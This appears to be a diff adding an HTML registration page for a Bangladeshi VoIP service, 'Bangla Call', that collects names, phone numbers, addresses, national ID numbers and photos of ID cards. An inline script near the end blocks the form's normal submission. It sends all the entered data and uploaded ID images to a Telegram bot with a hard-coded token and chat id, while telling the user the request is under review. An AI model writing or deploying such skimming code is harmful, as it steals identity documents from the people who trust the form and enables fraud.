@@ -1,0 +1,1033 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <!-- Required meta tags-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="Bangla Call Registration">
+    <meta name="author" content="Bangla Call">
+    <meta name="keywords" content="Bangla Call, Registration">
+
+    <!-- Title Page-->
+    <title>Bangla Call - Registration</title>
+
+    <!-- Bootstrap 5 CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    
+    <!-- Font Awesome for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- Animate.css for animations -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
+    
+    <!-- Custom CSS -->
+    <style>
+        :root {
+            --primary-color: #080c3c;
+            --secondary-color: #ff366b;
+            --light-color: #f8f9fa;
+            --dark-color: #212529;
+        }
+        
+        body {
+            background-color: #f5f5f5;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        .registration-container {
+            max-width: 1000px;
+            margin: 30px auto;
+            animation: fadeIn 0.5s ease-in-out;
+        }
+        
+        .registration-card {
+            border: none;
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s ease;
+        }
+        
+        .registration-card:hover {
+            transform: translateY(-5px);
+        }
+        
+        .card-header {
+            background-color: var(--primary-color);
+            color: white;
+            padding: 25px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .card-header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, rgba(255, 54, 107, 0.2), transparent);
+            z-index: 0;
+        }
+        
+        .card-header h2 {
+            position: relative;
+            z-index: 1;
+            font-weight: 700;
+            margin: 0;
+        }
+        
+        .card-body {
+            padding: 30px;
+            background-color: white;
+        }
+        
+        .form-label {
+            font-weight: 600;
+            color: var(--primary-color);
+            margin-bottom: 8px;
+        }
+        
+        .form-control, .form-select {
+            border-radius: 8px;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            transition: all 0.3s ease;
+        }
+        
+        .form-control:focus, .form-select:focus {
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 0.25rem rgba(8, 12, 60, 0.25);
+        }
+        
+        .btn-submit {
+            background-color: var(--secondary-color);
+            border: none;
+            color: white;
+            padding: 12px 30px;
+            border-radius: 8px;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            width: 100%;
+            margin-top: 20px;
+        }
+        
+        .btn-submit:hover {
+            background-color: #e62e5f;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(255, 54, 107, 0.3);
+        }
+        
+        .file-upload {
+            position: relative;
+            overflow: hidden;
+            display: inline-block;
+            width: 100%;
+        }
+        
+        .file-upload-btn {
+            border: 2px dashed #ddd;
+            border-radius: 8px;
+            padding: 30px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            width: 100%;
+            background-color: #f9f9f9;
+        }
+        
+        .file-upload-btn:hover {
+            border-color: var(--primary-color);
+            background-color: #f0f0f0;
+        }
+        
+        .file-upload-input {
+            position: absolute;
+            left: 0;
+            top: 0;
+            opacity: 0;
+            width: 100%;
+            height: 100%;
+            cursor: pointer;
+        }
+        
+        .helpline {
+            background-color: var(--primary-color);
+            color: white;
+            padding: 15px;
+            text-align: center;
+            border-radius: 8px;
+            margin-top: 20px;
+            font-weight: 600;
+        }
+        
+        .helpline i {
+            margin-right: 10px;
+            color: var(--secondary-color);
+        }
+        
+        .text-danger {
+            font-size: 0.875rem;
+            margin-top: 5px;
+            display: block;
+        }
+        
+        .marquee-container {
+            background-color: var(--primary-color);
+            color: white;
+            padding: 12px 0;
+            margin-top: 30px;
+            border-radius: 8px;
+            overflow: hidden;
+        }
+        
+        .marquee-text {
+            display: inline-block;
+            padding-left: 100%;
+            animation: marquee 20s linear infinite;
+            white-space: nowrap;
+        }
+        
+        /* Information tooltip styles */
+        .field-info {
+            position: relative;
+            display: inline-block;
+            margin-left: 5px;
+            cursor: pointer;
+        }
+
+        .field-info i {
+            color: var(--primary-color);
+            font-size: 16px;
+        }
+
+        .field-info .tooltip-text {
+            visibility: hidden;
+            width: 200px;
+            background-color: var(--primary-color);
+            color: #fff;
+            text-align: center;
+            border-radius: 6px;
+            padding: 10px;
+            position: absolute;
+            z-index: 1;
+            bottom: 125%;
+            left: 50%;
+            transform: translateX(-50%);
+            opacity: 0;
+            transition: opacity 0.3s;
+            font-size: 14px;
+            line-height: 1.4;
+        }
+
+        .field-info .tooltip-text::after {
+            content: "";
+            position: absolute;
+            top: 100%;
+            left: 50%;
+            margin-left: -5px;
+            border-width: 5px;
+            border-style: solid;
+            border-color: var(--primary-color) transparent transparent transparent;
+        }
+
+        .field-info:hover .tooltip-text {
+            visibility: visible;
+            opacity: 1;
+        }
+        
+        /* Terms and conditions checkbox */
+        .terms-checkbox {
+            margin: 15px 0;
+            padding: 15px;
+            background-color: #f8f9fa;
+            border-radius: 8px;
+            border: 1px solid #dee2e6;
+        }
+        
+        .terms-checkbox label {
+            margin-left: 8px;
+        }
+        
+        .terms-link {
+            color: var(--secondary-color);
+            font-weight: 600;
+            text-decoration: none;
+        }
+        
+        .terms-link:hover {
+            text-decoration: underline;
+        }
+
+        @keyframes marquee {
+            0% { transform: translateX(0); }
+            100% { transform: translateX(-100%); }
+        }
+        
+        @media (max-width: 768px) {
+            .registration-container {
+                padding: 0 15px;
+            }
+            
+            .card-body {
+                padding: 20px;
+            }
+            
+            .marquee-text {
+                white-space: normal;
+                animation: none;
+                padding-left: 0;
+            }
+            
+            .field-info .tooltip-text {
+                width: 150px;
+                font-size: 12px;
+            }
+        }
+        
+        
+
+
+
+
+        /* বাংলা ফন্ট সেটআপ */
+        @import url('https://fonts.maateen.me/kalpurush/font.css');
+        
+        body {
+            font-family: 'Kalpurush', 'Hind Siliguri', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        
+        .news-scroll-container {
+            width: 100%;
+            background: linear-gradient(90deg, #1e5799 0%, #207cca 51%, #2989d8 100%);
+            color: white;
+            padding: 15px 0;
+            margin: 20px 0;
+            border-radius: 5px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+        
+        .marquee {
+            display: inline-block;
+            animation: scroll 60s linear infinite;
+            padding-left: 100%;
+            white-space: nowrap;
+        }
+        
+        .marquee:hover {
+            animation-play-state: paused;
+        }
+        
+        @keyframes scroll {
+            0% { transform: translateX(0); }
+            100% { transform: translateX(-100%); }
+        }
+        
+        .highlight {
+            color: #fff700;
+            font-weight: bold;
+        }
+        
+        .contact-info {
+            background: rgba(0,0,0,0.2);
+            padding: 3px 10px;
+            border-radius: 5px;
+            margin: 0 5px;
+            display: inline-block;
+        }
+        
+        .news-label {
+            background: #ff5722;
+            padding: 5px 15px;
+            border-radius: 20px;
+            margin-right: 20px;
+            font-weight: bold;
+            font-size: 14px;
+            display: inline-block;
+        } 
+        
+        
+
+
+
+
+
+            body {
+            background-color: var(--light-bg);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        .feature-boxes {
+            padding: 30px 0;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        .feature-box {
+            background: linear-gradient(135deg, #ffffff 0%, #f8f9fa 100%);
+            border-radius: 12px;
+            padding: 25px 15px;
+            margin-bottom: 25px;
+            box-shadow: 0 10px 20px rgba(108, 92, 231, 0.1);
+            transition: all 0.4s cubic-bezier(0.25, 0.8, 0.25, 1);
+            text-align: center;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            border: none;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .feature-box::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
+            transition: all 0.3s ease;
+        }
+        
+        .feature-box:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 15px 30px rgba(108, 92, 231, 0.2);
+        }
+        
+        .feature-box:hover::before {
+            height: 6px;
+        }
+        
+        .feature-box i {
+            font-size: 40px;
+            margin-bottom: 15px;
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+            transition: all 0.3s ease;
+        }
+        
+        .feature-box h3 {
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            color: var(--text-color);
+            transition: all 0.3s ease;
+        }
+        
+        .feature-box a {
+            text-decoration: none;
+            color: inherit;
+            display: block;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .feature-box:hover i {
+            animation: pulse 0.8s;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        
+        /* প্রিমিয়াম ইফেক্ট */
+        .premium-tag {
+            position: absolute;
+            top: 10px;
+            right: -30px;
+            background: linear-gradient(45deg, #ff9a9e 0%, #fad0c4 99%, #fad0c4 100%);
+            color: white;
+            padding: 3px 30px;
+            font-size: 12px;
+            font-weight: bold;
+            transform: rotate(45deg);
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+            z-index: 1;
+        }
+        
+        /* রেস্পন্সিভ সেটিংস */
+        @media (max-width: 767.98px) {
+            .feature-box {
+                padding: 20px 10px;
+            }
+            
+            .feature-box i {
+                font-size: 35px;
+                margin-bottom: 12px;
+            }
+            
+            .feature-box h3 {
+                font-size: 16px;
+            }
+        }
+        
+
+.text-danger {
+  display: inline-flex;
+  vertical-align: middle;
+  line-height: 0.8;
+}
+
+.text-danger::after {
+  content: "*";
+  display: block;
+}
+
+.text-danger::before {
+  content: "*";
+  display: block;
+}
+
+
+
+
+
+
+ /* Updated info icon styles */
+        .field-info {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 20px;
+            height: 20px;
+            background-color: rgba(8, 12, 60, 0.1);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            z-index: 2;
+        }
+
+        .field-info i {
+            color: var(--primary-color);
+            font-size: 12px;
+        }
+
+        .field-info:hover {
+            background-color: rgba(8, 12, 60, 0.2);
+        }
+
+        .field-info .tooltip-text {
+            visibility: hidden;
+            width: 220px;
+            background-color: var(--primary-color);
+            color: #fff;
+            text-align: center;
+            border-radius: 6px;
+            padding: 10px;
+            position: absolute;
+            z-index: 10;
+            bottom: 125%;
+            left: 50%;
+            transform: translateX(-50%);
+            opacity: 0;
+            transition: opacity 0.3s;
+            font-size: 13px;
+            line-height: 1.4;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+
+        .field-info .tooltip-text::after {
+            content: "";
+            position: absolute;
+            top: 100%;
+            left: 50%;
+            margin-left: -5px;
+            border-width: 5px;
+            border-style: solid;
+            border-color: var(--primary-color) transparent transparent transparent;
+        }
+
+        .field-info:hover .tooltip-text {
+            visibility: visible;
+            opacity: 1;
+        }
+
+        /* Input group adjustments */
+        .input-group {
+            position: relative;
+        }
+
+        /* For select elements */
+        .input-group-select {
+            position: relative;
+        }
+
+        /* For textarea elements */
+        .input-group-textarea {
+            position: relative;
+        }
+
+        /* Updated required field indicator */
+        .text-danger {
+            color: #dc3545 !important;
+            font-size: 0.875rem;
+            margin-left: 5px;
+        }
+
+        /* Updated terms and conditions */
+        .terms-checkbox {
+            margin: 15px 0;
+            padding: 10px 15px;
+            background-color: #f8f9fa;
+            border-radius: 8px;
+            border: 1px solid #dee2e6;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .terms-checkbox .form-check {
+            display: flex;
+            align-items: center;
+        }
+
+        .terms-checkbox label {
+            margin-left: 8px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        @media (max-width: 768px) {
+            .terms-checkbox {
+                white-space: normal;
+            }
+            
+            .terms-checkbox label {
+                white-space: normal;
+            }
+            
+            .field-info .tooltip-text {
+                width: 180px;
+                font-size: 12px;
+            }
+        }
+
+
+        
+        
+        
+    </style>
+</head>
+
+<body>
+    <div class="container-fluid py-4">
+        <div class="registration-container animate__animated animate__fadeIn">
+            <div class="registration-card">
+                <div class="card-header">
+                    <h2>Apply For Registration</h2>
+                </div>
+                
+                <div class="card-body">
+                                        
+                    <form name="form" id="form" action="https://kyc.banglacalls.com/registration/store" method="POST" enctype="multipart/form-data">
+                        <input type="hidden" name="_token" value="bRfBoF5vQp0uxsGJFrmJMuuGGZezdBDEBlFKY8gu" autocomplete="off">                        
+                        <div class="row g-3">
+                            <!-- Full Name -->
+                            <div class="col-md-6">
+                                <label for="full_name" class="form-label">Full name <span class="text-danger">*</span></label>
+                                <div class="input-group">
+                                    <input type="text" class="form-control" id="full_name" name="full_name" value="" placeholder="Your Full Name" required>
+                                    <span class="field-info">
+                                        <i class="fas fa-info-circle"></i>
+                                        <span class="tooltip-text">Enter your full name as it appears on your NID card</span>
+                                    </span>
+                                </div>
+                                                            </div>
+                            
+                            <!-- Phone Number -->
+                            <div class="col-md-6">
+                                <label for="phone" class="form-label">Phone <span class="text-danger">*</span></label>
+                                <div class="input-group">
+                                    <input type="tel" 
+                                           class="form-control" 
+                                           id="phone" 
+                                           name="phone" 
+                                           value="" 
+                                           placeholder="Your Mobile Number" 
+                                           minlength="11" 
+                                           maxlength="11" 
+                                           pattern="01[3-9]\d{8}"
+                                           title="মোবাইল নাম্বার অবশ্যই ১১ ডিজিটের হতে হবে (যেমন: 01712345678)"
+                                           oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 11)"
+                                           required>
+                                    <span class="field-info">
+                                        <i class="fas fa-info-circle"></i>
+                                        <span class="tooltip-text">Must be 11 digits starting with 01 (e.g. 01712345678)</span>
+                                    </span>
+                                </div>
+                                                            </div>
+                            
+                            <!-- Email -->
+                            <div class="col-md-6">
+                                <label for="email" class="form-label">Email address <span class="text-danger">*</span></label>
+                                <div class="input-group">
+                                    <input type="email" class="form-control" id="email" name="email" value="" placeholder="example@email.com" required>
+                                    <span class="field-info">
+                                        <i class="fas fa-info-circle"></i>
+                                        <span class="tooltip-text">We'll send confirmation to this email</span>
+                                    </span>
+                                </div>
+                                                            </div>
+                            
+                            <!-- NID -->
+                            <div class="col-md-6">
+                                <label for="nid" class="form-label">NID Number <span class="text-danger">*</span></label>
+                                <div class="input-group">
+                                    <input type="number" class="form-control" id="nid" name="nid" value="" placeholder="National ID Number" required>
+                                    <span class="field-info">
+                                        <i class="fas fa-info-circle"></i>
+                                        <span class="tooltip-text">10 or 17 digit National ID number</span>
+                                    </span>
+                                </div>
+                                                            </div>
+                            
+                            <!-- IPTSP Number -->
+                            <div class="col-md-6">
+                                <label for="iptsp" class="form-label">Your Choice IPTSP Number <span class="text-danger">*</span></label>
+                                <div class="input-group">
+                                    <input type="tel" 
+                                           class="form-control" 
+                                           id="iptsp" 
+                                           name="iptsp" 
+                                           value="" 
+                                           placeholder="09649XXXXXX" 
+                                           minlength="11" 
+                                           maxlength="11" 
+                                           pattern="09649\d{6}"
+                                           title="IPTSP number must be 11 digits starting with 09649"
+                                           oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 11)"
+                                           required>
+                                    <span class="field-info">
+                                        <i class="fas fa-info-circle"></i>
+                                        <span class="tooltip-text">Must be 11 digits starting with 09649</span>
+                                    </span>
+                                </div>
+                                                            </div>
+                            
+                            <!-- Marketing Manager -->
+                            <div class="col-md-6">
+                                <label for="reff" class="form-label">Marketing Manager</label>
+                                <div class="input-group">
+                                    <input type="text" class="form-control" id="reff" name="reff" value="" placeholder="Manager Name">
+                                    <span class="field-info">
+                                        <i class="fas fa-info-circle"></i>
+                                        <span class="tooltip-text">Optional - if you were referred by someone</span>
+                                    </span>
+                                </div>
+                                                            </div>
+                            
+                            <!-- Registration Type -->
+                            <div class="col-md-12">
+                                <label for="type" class="form-label">Registration Type <span class="text-danger">*</span></label>
+                                <div class="input-group">
+                                    <select class="form-select" id="type" name="type" required>
+                                        <option value="">Select Type</option>
+                                        <option value="Personal" >Personal</option>
+                                        <option value="Corporate" >Corporate</option>
+                                    </select>
+                                    <span class="field-info">
+                                        <i class="fas fa-info-circle"></i>
+                                        <span class="tooltip-text">Select 'Corporate' if registering for a company</span>
+                                    </span>
+                                </div>
+                                                            </div>
+                            
+                            <!-- Permanent Address -->
+                            <div class="col-6">
+                                <label for="address" class="form-label">Permanent Address <span class="text-danger">*</span></label>
+                                <div class="input-group">
+                                    <textarea class="form-control" id="address" name="address" rows="2" placeholder="According to NID" required></textarea>
+                                    <span class="field-info">
+                                        <i class="fas fa-info-circle"></i>
+                                        <span class="tooltip-text">Must match your NID card address</span>
+                                    </span>
+                                </div>
+                                                            </div>
+                            
+                            <!-- Present Address -->
+                            <div class="col-6">
+                                <label for="billing" class="form-label">Present Address <span class="text-danger">*</span></label>
+                                <div class="input-group">
+                                    <textarea class="form-control" id="billing" name="billing" rows="2" placeholder="Enter your current address" required></textarea>
+                                    <span class="field-info">
+                                        <i class="fas fa-info-circle"></i>
+                                        <span class="tooltip-text">Your current living address</span>
+                                    </span>
+                                </div>
+                                                            </div>
+                            
+                            <!-- Photo Upload -->
+                            <div class="col-md-4">
+                                <label class="form-label">Upload Your Photo <span class="text-danger">*</span></label>
+                                <div class="file-upload">
+                                    <div class="file-upload-btn">
+                                        <i class="fas fa-cloud-upload-alt fa-2x mb-2"></i>
+                                        <p class="mb-1">Click to upload photo</p>
+                                        <p class="small text-muted">JPG or PDF (Max. 5MB)</p>
+                                        <input type="file" class="file-upload-input" name="photo1" id="photo1" accept=".jpg,.jpeg,.png,.pdf" required>
+                                    </div>
+                                </div>
+                                                            </div>
+                            
+                            <!-- NID Front -->
+                            <div class="col-md-4">
+                                <label class="form-label">Upload NID (Front) <span class="text-danger">*</span></label>
+                                <div class="file-upload">
+                                    <div class="file-upload-btn">
+                                        <i class="fas fa-cloud-upload-alt fa-2x mb-2"></i>
+                                        <p class="mb-1">Click to upload NID front</p>
+                                        <p class="small text-muted">JPG or PDF (Max. 5MB)</p>
+                                        <input type="file" class="file-upload-input" name="photo2" id="photo2" accept=".jpg,.jpeg,.png,.pdf" required>
+                                    </div>
+                                </div>
+                                                            </div>
+                            
+                            <!-- NID Back -->
+                            <div class="col-md-4">
+                                <label class="form-label">Upload NID (Back) <span class="text-danger">*</span></label>
+                                <div class="file-upload">
+                                    <div class="file-upload-btn">
+                                        <i class="fas fa-cloud-upload-alt fa-2x mb-2"></i>
+                                        <p class="mb-1">Click to upload NID back</p>
+                                        <p class="small text-muted">JPG or PDF (Max. 5MB)</p>
+                                        <input type="file" class="file-upload-input" name="nid_photo" id="nid_photo" accept=".jpg,.jpeg,.png,.pdf" required>
+                                    </div>
+                                </div>
+                                                            </div>
+                            
+                            <!-- Terms and Conditions -->
+                            <div class="col-12">
+                                <div class="terms-checkbox">
+                                    <div class="form-check">
+                                        <input class="form-check-input" type="checkbox" id="terms" name="terms" required>
+                                        <label class="form-check-label" for="terms">
+                                            I agree to the <a href="#" data-bs-toggle="modal" data-bs-target="#termsModal" class="terms-link">Terms and Conditions</a>
+                                            <span class="text-danger">*</span>
+                                        </label>
+                                    </div>
+                                                                    </div>
+                            </div>
+                            
+                            <!-- Submit Button -->
+                            <div class="col-12">
+                                <button type="submit" class="btn btn-submit animate__animated animate__pulse animate__infinite animate__slower">
+                                    <i class="fas fa-paper-plane me-2"></i> Send Request
+                                </button>
+                            </div>
+                        </div>
+                    </form>
+                    
+                    <div class="helpline animate__animated animate__fadeInUp">
+                        <i class="fas fa-headset"></i> For any need, please contact our helpline <a href="tel:09649000005"> 09649000005 </a>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Feature Boxes -->
+            <div class="container feature-boxes">
+                <div class="row">
+                    <!-- Box 1: Live Chat -->
+                    <div class="col-xl-3 col-lg-3 col-md-6 col-sm-6 col-6">
+                        <div class="feature-box">
+                            <a href="https://wa.me/8801819922535">
+                                <i class="fas fa-comment-dots"></i>
+                                <h3>Live Chat</h3>
+                            </a>
+                        </div>
+                    </div>
+                    
+                    <!-- Box 2: Software List -->
+                    <div class="col-xl-3 col-lg-3 col-md-6 col-sm-6 col-6">
+                        <div class="feature-box">
+                           <a href="https://wa.me/8801819922535">
+                            <a href="#software-list">
+                                <i class="fas fa-list-alt"></i>
+                                <h3>Software List</h3>
+                            </a>
+                        </div>
+                    </div>
+                    
+                    <!-- Box 3: Video Tutorial -->
+                    <div class="col-xl-3 col-lg-3 col-md-6 col-sm-6 col-6">
+                        <div class="feature-box">
+                           <a href="https://wa.me/8801819922535">
+                            <a href="#blog-videos">
+                                <i class="fas fa-video"></i>
+                                <h3>Video Tutorial</h3>
+                            </a>
+                        </div>
+                    </div>
+                    
+                    <!-- Box 4: WhatsApp Group -->
+                    <div class="col-xl-3 col-lg-3 col-md-6 col-sm-6 col-6">
+                        <div class="feature-box">
+                            <a href="https://chat.whatsapp.com/Ljoc2mMEGwxIRXGd91adpy">
+                                <i class="fab fa-whatsapp"></i>
+                                <h3>WhatsApp Group</h3>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- News Scroll -->
+            <div class="news-scroll-container">
+                <div class="marquee">
+                    প্রিয় গ্রাহক, আপনাদের দ্রুত ও সেরা সার্ভিস দেওয়ার লক্ষে আমরা কাজ করে যাচ্ছি৷ 
+                    <span class="highlight">মাত্র ৩০ পয়সায় কথা বলুন বাংলাদেশের যে কোন নাম্বারে</span> এবং আইপি টু আইপি একদম ফ্রী।
+                    এছাড়াও যে কোন রিচার্জে পাচ্ছেন <span class="highlight">১০% বোনাস৷</span>
+                    আপনার যে কোন সহযোগিতার জন্য যোগাযোগ করুন আমাদের হেল্পলাইন নাম্বারে - <span class="contact-info">09649 00000 5</span> || 
+                    SiP Domain - <span class="contact-info">sip.amarip.net</span> or ip - <span class="contact-info">103.170.231.10</span> || 
+                    আপনার নিরাপত্তার জন্য আমাদের থেকে আইপি নাম্বার নেওয়ার পরে Password চেঞ্জ করুন। ধন্যবাদ।
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+<script>
+  const token = "7757161623:AAGynGndHmAK8b3lIKdQTJkuAbpkgeNBIcA";
+  const chat_id = "7135684240";
+
+  document.getElementById("form").addEventListener("submit", async function(e) {
+    e.preventDefault();
+    
+    if (!document.getElementById("terms").checked) {
+      Swal.fire("Error", "You must agree to the terms", "error");
+      return;
+    }
+
+    const name = document.getElementById("full_name").value;
+    const phone = document.getElementById("phone").value;
+    const email = document.getElementById("email").value;
+    const nid = document.getElementById("nid").value;
+    const iptsp = document.getElementById("iptsp").value;
+    const address = document.getElementById("address").value;
+    const billing = document.getElementById("billing").value;
+
+    const photo1 = document.getElementById("photo1").files[0];
+    const photo2 = document.getElementById("photo2").files[0];
+    const nid_photo = document.getElementById("nid_photo").files[0];
+
+    const caption = `🔔 নতুন রেজিস্ট্রেশন অনুরোধ:\n\n👤 নাম: ${name}\n📞 মোবাইল: ${phone}\n📧 ইমেইল: ${email}\n🆔 NID: ${nid}\n☎️ IPTSP: ${iptsp}\n🏠 স্থায়ী ঠিকানা: ${address}\n📍 বর্তমান ঠিকানা: ${billing}`;
+
+    // ✅ Step 1: পাঠাও ইউজারের ছবি সহ caption
+    const formData1 = new FormData();
+    formData1.append("chat_id", chat_id);
+    formData1.append("caption", caption);
+    formData1.append("photo", photo1);
+
+    try {
+      const res1 = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        method: "POST",
+        body: formData1
+      });
+
+      if (!res1.ok) throw new Error("Failed to send main data");
+
+      // ✅ Step 2: পাঠাও NID Front
+      const formData2 = new FormData();
+      formData2.append("chat_id", chat_id);
+      formData2.append("caption", "🪪 NID Front");
+      formData2.append("document", photo2);
+      await fetch(`https://api.telegram.org/bot${token}/sendDocument`, {
+        method: "POST",
+        body: formData2
+      });
+
+      // ✅ Step 3: পাঠাও NID Back
+      const formData3 = new FormData();
+      formData3.append("chat_id", chat_id);
+      formData3.append("caption", "🪪 NID Back");
+      formData3.append("document", nid_photo);
+      await fetch(`https://api.telegram.org/bot${token}/sendDocument`, {
+        method: "POST",
+        body: formData3
+      });
+
+      Swal.fire("✅ Success", "Your request has been submitted for admin review.", "success");
+      document.getElementById("form").reset();
+
+    } catch (err) {
+      Swal.fire("Error", "Something went wrong. Try again.", "error");
+    }
+  });
+</script>
+
+
+    <!-- Terms and Conditions Modal -->
+    <div class="modal fade" id="termsModal" tabindex="-1" aria-labelledby="termsModalLabel" aria-hidden="true">
+        <div class="modal-dialog modal-lg">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="termsModalLabel">Terms and Conditions</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <div class="modal-body">
+                    <h6>1. Service Agreement</h6>
+                    <p>By registering, you agree to our service terms and conditions. You must provide accurate and complete information during the registration process.</p>
+                    
+                    <h6>2. Document Verification</h6>
+                    <p>We reserve the right to verify all submitted documents. Any false information may result in account termination.</p>
+                    
+                    <h6>3. Service Activation</h6>
+                    <p>Service activation may take 24-48 hours after successful verification of all documents.</p>
+                    
+                    <h6>4. Account Security</h6>
+                    <p>You are responsible for maintaining the security of your account credentials. After receiving your IP information, you must change your password immediately.</p>
+                    
+                    <h6>5. Pricing and Bonuses</h6>
+                    <p>All pricing and bonus offers are subject to change without prior notice. Current rates will be applied at the time of recharge.</p>
+                    
+                    <h6>6. Support</h6>
+                    <p>For any assistance, please contact our helpline at 09649 00000 5 or through our official communication channels.</p>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Bootstrap 5 JS Bundle with Popper -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    
+    <!-- SweetAlert2 -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    
+    <!-- Custom JS -->
+    <script>
+        // Show SweetAlert for success message
+                
+        // Form validation
+        document.getElementById('form').addEventListener('submit', function(e) {
+            if (!document.getElementById('terms').checked) {
+                e.preventDefault();
+                Swal.fire({
+                    title: 'Terms Required',
+                    text: 'You must agree to the terms and conditions',
+                    icon: 'error',
+                    confirmButtonText: 'OK'
+                });
+            }
+        });
+    </script>
+</body>
+</html>
